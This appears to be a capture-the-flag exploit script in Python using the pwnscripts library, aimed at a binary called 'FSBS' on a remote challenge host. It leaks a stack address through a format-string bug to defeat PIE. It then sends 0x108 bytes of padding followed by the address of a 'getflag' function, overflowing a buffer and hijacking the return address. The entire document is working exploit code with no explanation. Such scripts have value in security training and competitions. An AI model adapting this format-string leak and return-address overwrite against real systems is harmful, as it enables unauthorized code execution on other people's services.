from pwnscripts import *
context.binary = 'FSBS'
def start(s: bytes):
    r = remote('ctf-7jca.balancedcompo.site', 9994)
    r.sendafter('name:', s)
    r.recvline()
    return r, r.recvline()
@context.quiet
def printf(s: bytes):
    r, recv = start(s)
    r.close()
    return recv

context.binary.symbols['send_name_ret'] = 0xc34 + 0x77 # actual_main+0x77
context.binary.symbols['getflag'] = 0xa1a
context.log_level = 'debug'
PIE_off = fsb.find_offset.PIE(printf, offset=context.binary.symbols['send_name_ret'])

r, leak = start('%{}$p\n'.format(PIE_off))
context.binary.symbols['send_name_ret'] = unpack_hex(leak)

r.sendlineafter('Message:', b'A'*0x108 + pack(context.binary.symbols['getflag']))
r.interactive()
